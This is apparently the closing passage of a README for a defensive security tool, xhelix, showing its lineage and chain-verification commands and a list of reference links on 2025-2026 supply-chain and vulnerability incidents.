xhelixctl source lineage <anchor_id>

# Verify the forensic chain offline (independent auditor)
xhelix-verify --chain /var/lib/xhelix/chain --pub /etc/xhelix/chain.pub
```

The corpus exercises 12 real malware behavior stages and triggers the rules described above. Every alert is line-by-line auditable — no black-box scoring.

---

## Sources for Part 2 (recent 2025-2026 incidents)

Verified via live web search 2026-05-27. All CVE numbers, dates, and attack details traceable to:

- **Mini Shai-Hulud / TanStack npm worm (CVE-2026-45321):**
  - [TanStack postmortem](https://tanstack.com/blog/npm-supply-chain-compromise-postmortem)
  - [Wiz Blog](https://www.wiz.io/blog/mini-shai-hulud-strikes-again-tanstack-more-npm-packages-compromised)
  - [Microsoft Security Blog](https://www.microsoft.com/en-us/security/blog/2026/05/20/mini-shai-hulud-compromised-antv-npm-packages-enable-ci-cd-credential-theft/)
  - [The Hacker News](https://thehackernews.com/2026/05/mini-shai-hulud-worm-compromises.html)
  - [Tenable FAQ](https://www.tenable.com/blog/mini-shai-hulud-frequently-asked-questions)
  - [Palo Alto Unit 42](https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/)
- **cPanel/WHM CVE-2026-41940:**
  - [Help Net Security](https://www.helpnetsecurity.com/2026/04/30/cpanel-zero-day-vulnerability-cve-2026-41940-exploited/)
  - [watchtowr labs](https://labs.watchtowr.com/the-internet-is-falling-down-falling-down-falling-down-cpanel-whm-authentication-bypass-cve-2026-41940/)
  - [Picus Security](https://www.picussecurity.com/resource/blog/cve-2026-41940-explained-cpanel-whm-authentication-bypass-hit-1-5m-servers)
  - [SecurityWeek](https://www.securityweek.com/critical-cpanel-whm-vulnerability-exploited-as-zero-day-for-months/amp/)
  - [The Hacker News](https://thehackernews.com/2026/04/critical-cpanel-authentication.html)
- **Linux "Copy Fail" kernel CVE-2026-31431:**
  - [CISA / Cybersecurity News](https://cybersecuritynews.com/linux-kernel-0-day-vulnerability-exploited/)
  - [ThreatLocker](https://www.threatlocker.com/blog/linux-copy-fail-zero-day-enables-privilege-escalation)
  - [Cybersecurity News (deep dive)](https://cybersecuritynews.com/linux-kernel-0-day-copy-fail/)
  - [sredevops Kubernetes impact](https://www.sredevops.org/en/how-the-linux-kernel-copyfail-vulnerability-impacts-kubernetes-what-you-need-to-know-and-what-you-can-do/)
- **Linux Dirty Frag:** [BleepingComputer](https://www.bleepingcomputer.com/news/security/new-linux-dirty-frag-zero-day-with-poc-exploit-gives-root-privileges/)
- **tj-actions/changed-files CVE-2025-30066:**
  - [CISA Advisory](https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction)
  - [Palo Alto Unit 42](https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/)
  - [Endor Labs](https://www.endorlabs.com/learn/github-action-tj-actions-changed-files-supply-chain-attack-what-you-need-to-know)
- **Cisco FMC CVE-2026-20131:**
  - [The Hacker News](https://thehackernews.com/2026/03/interlock-ransomware-exploits-cisco-fmc.html)
  - [Help Net Security](https://www.helpnetsecurity.com/2026/03/20/cisco-fmc-interlock-ransomware-cve-2026-20131/)
  - [SecurityWeek](https://www.securityweek.com/cisco-firewall-vulnerability-exploited-as-zero-day-in-interlock-ransomware-attacks/)
- **Microsoft durabletask PyPI compromise:**
  - [StepSecurity](https://www.stepsecurity.io/blog/microsofts-durabletask-pypi-package-compromised-in-supply-chain-attack)
  - [Snyk](https://snyk.io/blog/durabletask-pypi-supply-chain-attack/)
  - [Sonatype](https://www.sonatype.com/blog/compromised-litellm-pypi-package-delivers-multi-stage-credential-stealer)
- **TrapDoor cross-ecosystem worm:**
  - [The Hacker News](https://thehackernews.com/2026/05/trapdoor-supply-chain-attack-spreads.html)
  - [GBHackers](https://gbhackers.com/hackers-compromise-34-npm-pypi-and-crates-packages/)
- **CloudNativePG CVE-2026-44477:** [SecurityOnline](https://securityonline.info/cloudnativepg-vulnerability-cve-2026-44477-postgresql-rce/)
- **MCPwnfluence CVE-2026-27825:** [Pluto Security](https://pluto.security/blog/mcpwnfluence-cve-2026-27825-critical/)
- **Atlassian Security Bulletins:** [Atlassian May 19 2026](https://confluence.atlassian.com/security/security-bulletin-may-19-2026-1786839142.html), [Atlassian March 17 2026](https://confluence.atlassian.com/security/security-bulletin-march-17-2026-1721271371.html)
- **CISA KEV catalog (canonical reference):** [https://www.cisa.gov/known-exploited-vulnerabilities-catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
